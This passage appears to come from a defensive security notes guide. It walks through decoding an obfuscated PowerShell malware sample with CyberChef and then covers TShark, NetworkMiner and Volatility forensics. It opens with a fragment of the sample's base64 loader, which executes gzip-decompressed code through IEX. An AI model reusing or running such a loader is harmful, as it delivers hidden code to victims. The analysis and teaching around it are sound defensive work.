gBiADgASQAwAFQAbQBuAEgAKwA4AHUAWQBPAG4AMgB6AGYAdQBRAFIAWgBCADgAYgB2ADMASQBSAGkAQwBpAFAAMwBoAGUAbwBaAGsASwBVAFUAWgByAEIAYwBkAEMARQBrAEoANABhAHoAZgB3AEoAeQB0ADAANgBaAEEAdwA0AEEAQQBBAD0APQAiACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA==
```

#### Building on what we know
[We already discussed](#setup-cyberchef) how to set cyberchef.

But keep in mind, to make this work we need to remove human-readable text....if we do this, we may lose track of what powershell the malware is actually deploying. So it's a good idea to make extensive notes.

![image](https://user-images.githubusercontent.com/44196051/121336621-9c5f8780-c913-11eb-86b4-fcb43c5d5a58.png)

We get some interestng stuff here. First, we can see it goes to base64 AGAIN; second, we can see that gzip is being brought into the game

#### Magic
But let's pretend we didn't see the Gzip part of the script. Is there a way we can 'guess' what methods obfscuation takes?

Absolutely, the option is called Magic in CyberChef. It's a kind of brute forcer for detecting encoding, and then offering a snippet of what the text would look like decoded.

![image](https://user-images.githubusercontent.com/44196051/121337043-04ae6900-c914-11eb-8243-72b2945fdd90.png)

So take the base64 text from the script, and re-enter it by itself
![image](https://user-images.githubusercontent.com/44196051/121337257-417a6000-c914-11eb-95f3-5e4bf9527974.png)

We can turn the UTF option off now, and turn magic on. I tend to give it a higher intensive number, as it's all client-side resource use so it's as strong as your machine is!

![image](https://user-images.githubusercontent.com/44196051/121337381-62db4c00-c914-11eb-9dce-58f81df1924e.png)

Well looky here, we can see some human-readable text. So now we know to stack add gzip to our decoding stack in cyberchef. From Magic, just click the link of the particular decoding option it offers

![image](https://user-images.githubusercontent.com/44196051/121337595-9f0eac80-c914-11eb-9b8d-093ad936d68c.png)

#### Gzip and Xor

We're starting to get somewhere with this script! But we're gonna need to do some more decoding unfortunately.

![image](https://user-images.githubusercontent.com/44196051/121337938-f14fcd80-c914-11eb-9d6f-8b435b13cd6b.png)

There's something sneaky about this malware. It's using some encyrption....but we can break it with XOR

![image](https://user-images.githubusercontent.com/44196051/121338577-89e64d80-c915-11eb-9653-3943527edec2.png)

If we trial and error with the numbers and decimals, we can eventually start the cracking process

![image](https://user-images.githubusercontent.com/44196051/121338868-d893e780-c915-11eb-8f3c-869d24bd4185.png)

#### Defang
CyberChef has taken us as far as we can go. To find out what happens next, we need to run this on a test rig. But we need to de-fang all of the dangerous bits of this script.

[John Hammond](https://www.youtube.com/watch?v=SRfmBaZeVSQ), a security researcher and awesome youtuber, introduced me to the concept of replacing variables in malicious scripts. If you replace-all for the variable, you can introduce variables that are familiar.

So for this script:
```powershell

#original variable
$s==New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAA......

#changed
$bse64=New-Object IO.Me
```
It isn't much, but in a big long complicated script, changing variables helps keep track of what's going on.

After this, we need to make sure that running this script won't actually execute anything malicious on our system. We just want to see what it will do.

Remove `IEX` where you see it. Don't get rid of the brackets though.
![image](https://user-images.githubusercontent.com/44196051/122641878-d6910c00-d0ff-11eb-9486-850b65b38d6d.png)

Once you've de-fanged the script, you are alright to run it and will just print the output to the screen:
![image](https://user-images.githubusercontent.com/44196051/122642110-a5650b80-d100-11eb-8f6b-6d9f5b33515c.png)


#### A Layer Deeper
So CyberChef got us here, and we were limited there. So now let's de-fang this resulting script and see where they takes us

If we scroll around, we can see see some of the logic of the script. At the bottom, we see that it will execute the output of a variable as a Job, which we've [touched on before](#scheduled-jobs)

![image](https://user-images.githubusercontent.com/44196051/122642283-8fa41600-d101-11eb-8e3d-f4786027a562.png)

Let's remove the IEX at the bottom, and neutralise the job by commenting it out
![image](https://user-images.githubusercontent.com/44196051/122642412-37b9df00-d102-11eb-8be2-58be82b88062.png)

....to be continued!!!

# SOC

## Sigma Converter

The TL;DR of [Sigma](https://github.com/SigmaHQ/sigma) is that it's awesome. I won't go into detail on what Sigma is, but I will tell you about an awesome tool that lets you convert sigma rules into whatever syntax your SOC uses: [Uncoder](https://uncoder.io/) 

You can convert ONE standard Sigma rule into a range of other search syntax languages automatically
![image](https://user-images.githubusercontent.com/44196051/120665902-16ab8a00-c484-11eb-992d-621decf78a0c.png)

### Uncoder Example: Colbalt Strike

Here, we can see that a sigma rule for CS process injection is automtically converted from a standard sigma rule into a *Kibana Saved Search*

![image](https://user-images.githubusercontent.com/44196051/120666031-2a56f080-c484-11eb-907c-dad340bade0f.png)

---

## SOC Prime

[SOC Prime](https://tdm.socprime.com/) is a market place of Sigma rules for the latest and greatest exploits and vulnerabilities

![image](https://user-images.githubusercontent.com/44196051/120675327-def51000-c48c-11eb-8dcf-a07b98288661.png)

You can pick a rule here, and convert it there and then for the search langauge you use in your SOC

![image](https://user-images.githubusercontent.com/44196051/120675130-b66d1600-c48c-11eb-9377-27098fce2283.png)

---

# Network Traffic

I'll be honest with you. Network traffic is where it's at. Endpoints and their logs are fallible, they can be made to LIE to you by an adversary. But packets? Packet's don't lie.

There's a great [SANS talk](https://www.sans.org/webcasts/packets-didnt-happen-network-driven-incident-investigations-119100) and [corresponding paper](https://www.sans.org/reading-room/whitepapers/analyst/membership/40300), called _Packets or it Didn't Happen_,  all about the utility of network traffic's advantadges over endpoint log monitoring. 

<details>
    <summary>section contents</summary>

  + [TShark](#tshark)
  + [Extracting Stuff](#extracting-stuff)
  
</details>


---

## TShark

<details>
    <summary>section contents</summary>

  + [Add Colour](#add-colour)
  + [Add Time](#add-time)
  + [Add Readable Detail](#add-readable-detail)
    - [Get Specific Packet](#get-specific-packet)
  + [Ideal base for any TShark command](#ideal-base-for-any-tshark-command)
  + [Change Format of Packet](#change-format-of-packets)
    - [Get format options](#get-format-options)
      - [Prepare for Elastic](#prepare-for-elastic)
      - [Tabs](#tabs)
      - [Other Formats](#other-formats)
  + [Filtering](#filtering)
    - [Glossary](#glossary)
    - [By Protocol](#by-protocol)
    - [By IP](#by-ip)
    - [Using DisplayFilters](#using-displayfilters)
  + [Stats](#stats)
    - [Get Conversations](#get-conversations)
      - [IP Conversations](#ip-conversations)
      - [DHCP Conversations](#dhcp-conversations)
      - [DNS Conversations](#dns-conversations)
      - [SIP Conversations](#sip-conversations)
      - [Stats on Protocols Involved in Traffic](#stats-on-protocols-involved-in-traffic)
      - [Filter Between Two IPs](#filter-between-two-Ips)
    - [HTTP](#http)
      - [Resolve Hosts](#resolve-hosts)
      - [Find User Agents](#find-user-agents)
      - [Get MAC Addresses](#get-mac-addresses)
    - [Get Credentials](#get-credentials)
  
</details>

TShark is the terminal implementation of Wireshark. Both Tshark and Wireshark can read captured network traffic (PCAPs).

There are resource advantages to using TShark, as you are keeping everything command line and can pre-filter before you even ingest and read a file. A meaty pcap will take a while to be ingested by Wireshark on the other hand. But once ingested, Wireshark proves to be the better option. If you're in a hurry, TShark will give you the answers you need at break-neck speed!


---

### Add Colour

An essential part of making TShark _aesthetically_ pop. Adding colour makes an analysts life easier. 

However the `--color` flag doesn't stack well with other flags, so be careful. 

```bash
tshark --color -r c42-MTA6.pcap

## stacks well with these flags
tshark -t ud -r c42-MTA6.pcap -x -P --color
```
![2021-06-18_17-40](https://user-images.githubusercontent.com/44196051/122593574-c45e9180-d05d-11eb-8d93-f03d3f67ee09.png)

---

### Add Time

By default, packets' time will show the time lasped between packets. This may not be the most useful method if you're trying to quickly correleate time

```bash
#Get the UTC.Preferable in security, where we always try to keep security tooling at UTC time, for consitency across tools
tshark -r c42-MTA6.pcap -t ud

#Get the local year, month, date, and time the packet was captured
tshark -r c42-MTA6.pcap -t ad
```

![image](https://user-images.githubusercontent.com/44196051/122607616-c41cc100-d072-11eb-9cc1-884454f3bf68.png)


### Add Readable Detail

What's a packet without the decoded text! Use the `-x` flag to get some insight into what's occuring

```bash
tshark -r Voip-trace.pcap -x
```
![image](https://user-images.githubusercontent.com/44196051/122620121-06053180-d08a-11eb-9058-7c466642a571.png)

Also, you can add verbose mode which includes all of Wireshark's drop-down details that you'd normally get. This can yield a whole lot of data, so best to try and filter this bad boy

```bash
#just verbose
tshark -r Voip-trace.pcap -V

#filtered a bit to focus on sip protocol only
tshark -r Voip-trace.pcap -V -x -Y sip
```
![image](https://user-images.githubusercontent.com/44196051/122620266-68f6c880-d08a-11eb-85dc-f414e28e154d.png)


You'll also probably want to print the packet line too, with `-P`

```bash
tshark -r c42-MTA6.pcap -V -x -Y dns -P

```
![image](https://user-images.githubusercontent.com/44196051/122622067-6e0a4680-d08f-11eb-820d-0a82847ec904.png)

##### Get Specific Packet

Say a particular packet header captures your eye. You want to get as much info as possible on that specific packet.

Take note of it's packet number.

![image](https://user-images.githubusercontent.com/44196051/123178706-ad65d800-d47f-11eb-8d26-2d45531544e4.png)

Then, insert it's packet number under `-c`
```bash
tshark -r packet.pcapng -x -V -P -c 27300| tail -n 120
#-c means show up to this number
#the -n 120 in tail can be changed to whatever you length you need
```
Now we get the full packet details for the specific packet that we wanted.

![image](https://user-images.githubusercontent.com/44196051/123178949-3977ff80-d480-11eb-8b7b-9ab95032f0bc.png)



#### Ideal base for any TShark command

We can stack lots and lots of things in TShark, but there are some ideal flags that we've already mentioned (or not yet mentioned) that form a solid base. Adding these flags in, or variations of them, will usually always ensure we don't get too lost. 

```bash
#read the pcacp, print time in UTC, verbose details, hex/ascii, print packet summary line, AND filter by a protocol (in this case DNS)
tshark -r c42-MTA6.pcap -t ud -V -x -P -Y dns

##print all the packets and the hex/ASCII, with color
tshark -t ud -r c42-MTA6.pcap -x -P --color
```
---

### Change Format of Packet

For reasons various, you may not be satisfied with how a packet is printed by default. 

#### Get Format Options
To find out the options you have and the descriptions behind them, run this bad boy:

```bash
#the help will fail to do anything but don't worry about that
tshark -T help
```
![image](https://user-images.githubusercontent.com/44196051/122594520-05a37100-d05f-11eb-9292-e96863f185c8.png)


##### Prepare for Elastic

Say for example we want to upload a packet into an ELK stack, we can print the PCAP in Elastic format.
```bash
#print it to terminal in Elastic format
  # -P means packet summary
  # -V means packet details
tshark -T ek -P -V -r c42-MTA6.pcap

#you can always filter by protocls with -j
tshark -T ek -j "http tcp ip" -P -V -r c42-MTA6.pcap

#output it to elastic format and save in a file, to be ingested by an ELK later
tshark -T ek -P -V -r c42-MTA6.pcap > elastic.json
```

Notice how Elastic wraps things around `{}`, the curly brackets.

![image](https://user-images.githubusercontent.com/44196051/122594999-ad20a380-d05f-11eb-94d5-72c19044bfca.png)

Moreover, Elastic needs a *mapping index* as a template to convert this packet business into somthing ELK can understand. 

```bash
#this is a BIG output
tshark -G elastic-mapping > map.index
#You can filter by protocol
tshark -G elastic-mapping --elastic-mapping-filter ip,smb,dns,tcp  > map.index
```
![image](https://user-images.githubusercontent.com/44196051/122596008-2a98e380-d061-11eb-9af4-16a3a9c75801.png)

![image](https://user-images.githubusercontent.com/44196051/122596228-75b2f680-d061-11eb-81aa-9bdf6beed4dc.png)


##### Tabs

You know how in Wireshark you can open up the drop-down tabs to filter and get more info?

![image](https://user-images.githubusercontent.com/44196051/122599438-481c7c00-d066-11eb-9eda-f9f7fb23751f.png)

You can do that in TShark too. Though it just prints ALL of the tabs
```bash
tshark -T tabs -V -r c42-MTA6.pcap

#can do more or less the same just flagging -V from normal
tshark -V -r c42-MTA6.pcap
```
![image](https://user-images.githubusercontent.com/44196051/122599551-77cb8400-d066-11eb-929a-38dc7f2d0f64.png)


##### Other Formats

You can always do JSON 

```bash
tshark -T json -r c42-MTA6.pcap
```
![image](https://user-images.githubusercontent.com/44196051/122597042-b8c19980-d062-11eb-8702-b8369334b2dd.png)

Packet Details Markup Language (PDML) is an XML-style represenation

```bash
tshark -T pdml -r c42-MTA6.pcap
```
![image](https://user-images.githubusercontent.com/44196051/122597477-51581980-d063-11eb-9098-8adb8d604805.png)

PostScript (PS) is an interesting one. I don't particularly know the purpose of it to be honest with you. All I know is it can eventually create a cool looking pdf.

```bash
# create a ps
tshark -T ps -r c42-MTA6.pcap > test.ps

## you can be verbose. This will make a CHUNGUS file though, very unwiedly
tshark -T ps -V -r c42-MTA6.pcap > verbose.ps

#You can convert it online in various places and turn it into a PDF
```

Raw PS

![image](https://user-images.githubusercontent.com/44196051/122598814-3e464900-d065-11eb-9334-717a2dee3888.png)


Size difference between -verbose flag on and off

![image](https://user-images.githubusercontent.com/44196051/122598662-09d28d00-d065-11eb-83e8-b3e242bcab00.png)

Converted to PDF

![image](https://user-images.githubusercontent.com/44196051/122598850-4f8f5580-d065-11eb-8757-c8329a507bfb.png)

---

### Filtering

#### Glossary

`-G` is a GREAT flag. Using `tshark -G help` you can get an overview for everything the Glossary can show you

![image](https://user-images.githubusercontent.com/44196051/122604193-75b8f380-d06d-11eb-9b0b-6aa4e5236f9a.png)

##### Protocols
```bash
tshark -G protocols

#If you know the family of protocol you already want, grep for it
tshark -G protocols | grep -i smb
```

![image](https://user-images.githubusercontent.com/44196051/122604416-d6483080-d06d-11eb-9454-4c710bd8aa90.png)


#### By Protocol

Filter the protocols you want under the -Y flag
```bash
#get just the one
tshark -r c42-MTA6.pcap -Y "dhcp"
tshark -r c42-MTA6.pcap -V -Y "dhcp" #will be vebose and add way more info

#Or treat yourself and collect more than one
tshark -r c42-MTA6.pcap -Y "dhcp or http"
tshark -r c42-MTA6.pcap -V -Y "dhcp or http" #will be vebose and add way more info
```
![image](https://user-images.githubusercontent.com/44196051/122602566-f62a2500-d06a-11eb-8eb5-4419774cd3f3.png)


If you want to only show detail for particuar protocols, but not filter OUT existing protocols and packets, then the `-O` is your man
```bash
tshark -r c42-MTA6.pcap -O http

#You can have more than one by comma seperation
tshark -r c42-MTA6.pcap -O http,ip

```
![image](https://user-images.githubusercontent.com/44196051/122605195-08a65d80-d06f-11eb-8c20-30d194754cc1.png)


#### By IPs

You can can hunt down what a particular IP is up to in your packet

```bash
tshark -r c42-MTA6.pcap -Y "ip.addr==192.168.137.56" 

#For style points, pipe to ack so it will highlight when your IP appears!
| ack '192.168.137.56'
```

![image](https://user-images.githubusercontent.com/44196051/122602816-57ea8f00-d06b-11eb-9653-10c98a4f3630.png)

If you want to get a list of all the IPs involved in this traffic, get by Host IP and Destination IP

```bash
# you can use the -z flag, and we'll get onto that in more detail later
tshark -r c42-MTA6.pcap -q -z ip_hosts,tree
tshark -r c42-MTA6.pcap -q -z ip_srcdst,tree
```
![image](https://user-images.githubusercontent.com/44196051/122603021-a566fc00-d06b-11eb-9156-d3a664ade21a.png)

Alternatively, just do a dirty grep regex to list out all the IPs
```bash
tshark -r c42-MTA6.pcap |
grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | 
sort -u
```
![image](https://user-images.githubusercontent.com/44196051/122603441-3a69f500-d06c-11eb-8068-93b4a02c6f86.png)

#### Using DisplayFilters

DisplayFilters are grep-like methods to control exactly what packets are shown to you. You can use filters by themselves, or stack them. I regularly use [DisplayFilter cheat sheets](https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf) as a reminder of all the filtering options avaliable. 


The trick to getting specific answers in TShark is to use DisplayFilters at the right time. You won't really use them for granularity at the beginning of an investigation. You may `-Y [protocol]` from the beginning, but to use DisplayFilters you need to have particular values that you are hunting for more information on. This inevitably comes as the investigation progresses. 

Perhaps you want to see what kind of HTTP codes have appeared
```bash
tshark -r packet.pcapng -t ud -Y 'http.response.code'
```
Once you see a particular code (say 200), you can filter down for more info

```bash
tshark -r packet.pcapng -t ud -Y 'http.response.code==200'

#to punish yourself, you can make it verbose now you've filtered it down
tshark -r packet.pcapng -t ud -Y 'http.response.code==200' -x -V -P
```

![image](https://user-images.githubusercontent.com/44196051/123527934-87d50a80-d6db-11eb-9685-cad808ae2026.png)

You may have seen a particular IP, and you want to know what TLS activity it's had

```bash
tshark -r packet.pcapng 'tls and ip.addr==159.65.89.65' 
```
![image](https://user-images.githubusercontent.com/44196051/123527803-6d4e6180-d6da-11eb-94b9-8243f7b95067.png)

Or maybe you have a particularly MAC address, and you want to know FTP instances

```bash
tshark -r packet.pcapng 'ftp and eth.addr==c8:09:a8:57:47:93'
```
![image](https://user-images.githubusercontent.com/44196051/123527831-adaddf80-d6da-11eb-8ac9-de133f15b0d7.png)

Maybe you're interested to see what DNS activity a particular IP address had

```bash
tshark -r packet.pcapng 'dns and ip.addr==192.168.1.26'
```
![image](https://user-images.githubusercontent.com/44196051/123528324-1a76a900-d6de-11eb-8530-a75a32c34b06.png)


You can find another example here for a [different instance](#Filter-Between-Two-IPs)


---

### Stats

The `-z` flag is weird. It's super useful to collect and aggregate stats about particular values. Want to know all of the IPs in captured traffic AND sort them according to how prevelant they are in traffic? `-z` is your guy

Get a list of all the things it can provide 
```bash
tshark -z help
```
![image](https://user-images.githubusercontent.com/44196051/122608278-d3e8d500-d073-11eb-90ca-e239b067f056.png)

#### Get Conversations
The `-z` flag can collect all the conversations that particular protocols are having. At the bottom, it will provide a table of stats

There are the services supported 

![image](https://user-images.githubusercontent.com/44196051/122608683-8f116e00-d074-11eb-9a76-af2d301b241b.png)
![image](https://user-images.githubusercontent.com/44196051/122608725-a2bcd480-d074-11eb-8536-5aa5552be689.png)

Some examples include:

##### IP conversations.
```bash
tshark -r c42-MTA6.pcap -q -z conv,ip
# the -q flag suppresses packets and just gives the STATS

#endpoints involved in traffic
tshark -r c42-MTA6.pcap -q -z endpoints,ipv4
```
![image](https://user-images.githubusercontent.com/44196051/122608548-4fe31d00-d074-11eb-9422-ea7ac45dd68e.png)
![image](https://user-images.githubusercontent.com/44196051/122611182-cc77fa80-d078-11eb-9ad2-fbbe5188be7d.png)

##### DNS Conversations
```bash
tshark -r c42-MTA6.pcap -q -z dns,tree
```
![image](https://user-images.githubusercontent.com/44196051/122610819-2c21d600-d078-11eb-98fe-f5b80606d981.png)

##### DHCP conversations
```bash
tshark -r c42-MTA6.pcap -q -z dhcp,stat
```
![image](https://user-images.githubusercontent.com/44196051/122610951-668b7300-d078-11eb-993d-145108c4421b.png)

##### SIP Conversations
```bash
tshark -r Voip-trace.pcap -q -z sip,stat 
```
![image](https://user-images.githubusercontent.com/44196051/122618625-832ea780-d086-11eb-8fe4-5f39d7502afa.png)


##### Stats on Protocols Involved in Traffic

This will display a heiarchy of the protocols involved in collected traffic

```bash
tshark -r c42-MTA6.pcap -q -z io,phs
```
![image](https://user-images.githubusercontent.com/44196051/122612981-f979dc80-d07b-11eb-8c1f-c363103a2161.png)

##### Filter Between Two IPs

Let's say we want to know when a local machine (192.168.1.26) communicated out to an external public IP (24.39.217.246) on UDP 

There are loads of ways to do this, but I'll offer two for now.

You can eyeball it. 
The advantadge of this method is that it shows the details of the communication on the right-hand size, in stats form (bytes transferred for example). But isn't helpful as you need to focus on every time the colours are on the same row, which is evidence that the two IPs are in communication. So it isn't actually clear how many times these two IPs communicated on UDP

```bash
tshark -r packet.pcapng -q -z conv,udp |ack '192.168.1.26|24.39.217.246
```
![image](https://user-images.githubusercontent.com/44196051/123527443-8d305600-d6d7-11eb-879c-d90c2d7cb7e1.png)


An alternate method is to filter by protocol and ip.addr. 
This is much more sophsticated method, as it allows greater granularity and offers flags to include UTC time. However, the tradeoff compared to the above version is that you don't get stats on the communication, like bytes communicated. You can add verbose flags, however these still don't get stats. 

```bash
tshark -r packet.pcapng -t ud 'udp and ip.addr==192.168.1.26 and ip.addr==24.39.217.246'
# | wc -l will let you know the number of commmunications
```
![image](https://user-images.githubusercontent.com/44196051/123527524-5c045580-d6d8-11eb-9516-58d812e9fe3c.png)


#### HTTP
We can collect a whole wealth of info on http stats with the `-z` flag

The various HTTP codes and requests in a hierarchy

```bash
tshark -r c42-MTA6.pcap -q -z http,tree
#change to http2,tree if necessary
```
![image](https://user-images.githubusercontent.com/44196051/122613334-950b4d00-d07c-11eb-9c95-b28f70b44625.png)


Part of `-z expert` will collect all the GET and POST requests. Just scroll down to *Chats*
```bash
tshark -r c42-MTA6.pcap -q -z expert
```
![image](https://user-images.githubusercontent.com/44196051/122613985-ae60c900-d07d-11eb-8794-924f8041e218.png)


##### Resolve Hosts

Collect IPs and the hostname they resolved to at the time

```bash
tshark -r c42-MTA6.pcap -q -z hosts
```
![image](https://user-images.githubusercontent.com/44196051/122611483-4dcf8d00-d079-11eb-843d-78e565630f89.png)

##### Find User Agents
```bash
tshark -r Voip-trace.pcap -Y http.request -T fields -e http.host -e http.user_agent | sort -u
```
![image](https://user-images.githubusercontent.com/44196051/122619105-92fabb80-d087-11eb-9742-56cac00b6a37.png)

#### Get MAC Addresses
It can be useful to know what MAC addresses have been involved in a conversation

```bash
#I picked FTP as a protocol to filter by, you don't have to. You could remove the -Y flag
tshark -r packet.pcapng -Y ftp -x -V -P | grep Ethernet | sort -u
```
![image](https://user-images.githubusercontent.com/44196051/123527243-b64fe700-d6d5-11eb-87db-3735d8c737b2.png)


#### Get Credentials
In theory, `-z credentials` will collect the credentials in packets. I, however, have not had much success with this tbh. 

```bash
tshark -r ftp.pcap -z credentials
```
![image](https://user-images.githubusercontent.com/44196051/122676704-14ad2f00-d1d7-11eb-9007-c7b175a92dd2.png)


Here's an alternative, less refined, works though.
```bash
tshark -r 0.pcap -V -x -P | grep -iE 'user|pass'
```
![image](https://user-images.githubusercontent.com/44196051/122676730-2bec1c80-d1d7-11eb-8403-bd307217638b.png)

---

## Extracting Stuff

Wireshark sometimes sucks when you want to quickly extract stuff and just look at it. Fortunately, there are alternatives to be able to quickly get and look at files, images, credentials, and more in packets.

<details>
    <summary>section contents</summary>

  + [NetworkMiner](#networkminer)
    - [View Files](#view-files)
    - [View Images](#view-images)
    - [View Creds](#view-creds)
  
  </details>

### NetworkMiner

NetworkMiner is GUI-based network traffic analysis tool. It can do lots of things, but the main things we can focus on here is the ability to rapidly look at all the _stuff_.

BUT, NetworkMiner has some limitations in its FREE version, so we'll just focus on some of its features. 

You can fire up NetworkMiner from command-line to ingest a particular pcap
```bash
networkminer c42-MTA6.pcap 
```
![image](https://user-images.githubusercontent.com/44196051/122639057-a3df1780-d0ef-11eb-9c8c-f8a638041730.png)

### View Files
In the top bar, you can filter for all of the files in the traffic.

![image](https://user-images.githubusercontent.com/44196051/122639240-b7d74900-d0f0-11eb-9d63-d4d1fa0cb537.png)


### View Images
In the top bar, you can filter for all of the images in the traffic. It will include any images rendered on websites, so you'll get a load of random crap too. 

![image](https://user-images.githubusercontent.com/44196051/122639126-fae4ec80-d0ef-11eb-917e-65844a086a2a.png)

Once you see a file you find interesting, right-click and view the file
![image](https://user-images.githubusercontent.com/44196051/122639309-04bb1f80-d0f1-11eb-83d6-b01107482f99.png)

### View Creds

Honestly, I find that these credential filters always suck. Maybe you'll have better luck 
![image](https://user-images.githubusercontent.com/44196051/122639517-2e287b00-d0f2-11eb-9b31-259b6fed6ed8.png)

# Digital Forensics

## volatility
<details>
    <summary>section contents</summary>

  + [Get Started](#get-started)
    - [Reviewing Options](#reviewing-options)
  + [Get Basics](#get-basics)
    - [Get Profile](#get-profile)
      - [Vol2](#vol2)
    - [Get Files](#get-files)
      - [Resurrect Files](#Resurrect-Files)
  + [Get Sus Activity](#get-sus-activity)
    - [Get Commands](#get-commands)
    - [Get Network Connections](#get-network-connections)
    - [Get Processes](#get-processes)
  
  </details>

There are loads of tools that can assist you with forensically exmaining stuff. Volatility is awesome and can aid you on your journey. Be warned though, digital forensics in general are resource-hungry and running it on a VM without adequate storage and resource allocated will lead to a bad time. 

In the Blue Team Notes, we'll use vol.py and vol3 (python2 and python3 implementation's of Volatility, respectively). In my un-educated, un-wise opinon, vol2 does SOME things better than vol3 - for example, Vol2 has plugins around browser history. 

Because Volatility can take a while to run things, the general advice is to always run commands and output them (`> file.txt`). This way, you do not need to sit and wait for a command to run to re-check something.


### Get Started
It's worth reviewing trhe Volatility docs, and make sure you've organised yourself as best as possible before getting started.

One important prep task is to download the [symbols table](https://github.com/volatilityfoundation/volatility3#symbol-tables) into your local machine

![image](https://user-images.githubusercontent.com/44196051/122973314-030b8900-d389-11eb-8cda-fbca5f041b09.png)

#### Reviewing options

Reading the [docs](https://volatility3.readthedocs.io/en/latest/) and the `-h` help option let you know exactly what options you have available

Python2: `Vol.py -h`

![image](https://user-images.githubusercontent.com/44196051/122974946-c2ad0a80-d38a-11eb-9773-4aaaefd3e583.png)

Python3: `vol3 -h`

When you see a plugin you like the look of, you can `-h` on it to get more options

```bash
#let's take the plugin windows.memmap.Memmap, for example
vol3 windows.memmap.Memmap -h
```
![image](https://user-images.githubusercontent.com/44196051/122976503-5501de00-d38c-11eb-9eb0-83d64b49bdc1.png)

Volatility has options for Linux, Mac, and Windows. The notes here mainly focus on Windows plugins, but the other OS' plugins are great fun too so give them a go sometime. 

### Get Basics

Get basic info about the dumped image itself

Find when the file was created
```bash
stat dumped_image.mem

#exiftool can achieve similar
exiftool dumped_image.mem
```

![image](https://user-images.githubusercontent.com/44196051/122972597-3994d400-d388-11eb-95fb-5f008132b359.png)

#### Get Profile

Get some basic info about the OS version of the dump 
```bash
vol3 -f dumped_image.mem windows.info.Info
```
![image](https://user-images.githubusercontent.com/44196051/122976239-12d89c80-d38c-11eb-8666-eda08346042d.png)

Get some info about the users on the machine
```sh
#run and output
vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.getsids.GetSIDs > sids.txt
#then filter
cut -f3,4 sids.txt | sort -u | pr -Ttd


#or just run it all in one. But you lose visibility to processes associated
vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.getsids.GetSIDs|
tee | cut -f3,4 | sort -u | pr -Ttd
```
![image](https://user-images.githubusercontent.com/44196051/122986422-55ec3d00-d397-11eb-8855-203125d6dd7e.png)

##### Vol2
In Volatility 2, you have to get the Profile of the image. This requires a bit more work. In theory, you can use `imageinfo` as a brute-force checker....however, this takes a long time and is probably not the best use of your valuable time.

I propose instead that you run the [Vol3](#get-profile), which will suggest what OS and build you have. Then pivot back to Vol2, and do the following:
```bash
#Collect the various profiles that exist
vol.py --info | grep Profile

#I then put these side to side in terminals, and try the different profiles with the below command
volatility -f image_dump.mem --profile=Win10x64_10586 systeminfo
```
![image](https://user-images.githubusercontent.com/44196051/123007954-f51e2e00-d3b1-11eb-938f-eb1a3cf91994.png)


Now that you have your Vol2 profile, you can leverage the plugins of both Vol2 and Vol3 with ease. 

#### Get Files
This plugin can fail on ocassion. Sometimes, it's just a case of re-running it. Other times, it may be because you need to install the symbol-tables. If it continually fails, default to python2 volatility.

```bash
sudo vol3 -f image_dump.mem windows.filescan > files.txt
cut -f2 files.txt |pr -Ttd | head -n 20

#get the size of files too
cut -f2,3 files.txt |pr -Ttd | head -n 20


#stack this will all kinds of things to find the files you want
cut -f2 files.txt | sort | grep 'ps1'
cut -f2 files.txt | sort | grep 'exe' 
cut -f2 files.txt | sort | grep 'evtx'

#Here's the Vol2 version of this
sudo vol.py -f image_dump.mem --profile=Win10x64_19041 directoryenumerator
```
![image](https://user-images.githubusercontent.com/44196051/122995420-820cbb80-d3a1-11eb-8085-a6b7d373065a.png)

![image](https://user-images.githubusercontent.com/44196051/122995678-d0ba5580-d3a1-11eb-98e4-8caf04205fe9.png)

![image](https://user-images.githubusercontent.com/44196051/122995929-27c02a80-d3a2-11eb-92a7-8c7517fd9387.png)


##### Resurrect Files
If a file catches your eye, you can push your luck and try to bring it back to life

```bash
#search for a file, as an example
cat files.txt | grep -i Powershell | grep evtx

#pick the virtual address in the first columnm, circled in the first image below
#feed it into the --virtaddr value
vol3 -f image_dump.mem windows.dumpfiles.DumpFiles --virtaddr 0xbf0f6d07ec10

#If you know the offset address, it's possible to look at the ASCII from hex
hd -n24 -s 0x45BE876 image_dump.mem
```

![image](https://user-images.githubusercontent.com/44196051/122997186-a5386a80-d3a3-11eb-9514-fb395171e4d1.png)

![image](https://user-images.githubusercontent.com/44196051/122997509-fcd6d600-d3a3-11eb-86e6-843ae3ca7efa.png)

![image](https://user-images.githubusercontent.com/44196051/123012957-24856880-d3bb-11eb-83bd-a423443d9a53.png)



### Get Sus Activity
Let's focus on retrieving evidence of suspicious and/or malicious activity from this image.

#### Get Commands
It's possible to retrieve the cmds run on a machine, sort of. 
```bash
vol3 -f image_dump.mem windows.cmdline > cmd.txt
cut -f2,3 cmd.txt | pr -Ttd

#if something catches your eye, grep for it
cut -f2,3 cmd.txt | grep -i 'powershell' | pr -Ttd

#| pr -Ttd spreads out the lines

```
![image](https://user-images.githubusercontent.com/44196051/122988527-bd0af100-d399-11eb-8947-6d2fcdceb785.png)

#### Get Network Connections

```bash
sudo vol3 -f image_dump.mem windows.netscan.NetScan > net.txt

#get everything interesting
cut -f2,5,6,9,10 net.txt | column -t
#| column -t spreads out the columns to be more readable

#extract just external IPs
cut -f5 net.txt | sort -u
#extract external IPs and their ports
cut -f5,6 net.txt | sort -u
```
![image](https://user-images.githubusercontent.com/44196051/122992887-8d121c80-d39e-11eb-9d0b-738e6c188673.png)

![image](https://user-images.githubusercontent.com/44196051/122992989-aadf8180-d39e-11eb-8119-77ccfef0896a.png)

#### Get Processes

Get a list of processes
```bash
vol3 -f image_dump.mem  windows.pslist > pslist.txt 
cut pslist.txt -f1,3,9,10 | column -t

##show IDs for parent and child, with some other stuff
cut -f1,2,3,9,10 pslist.txt
```

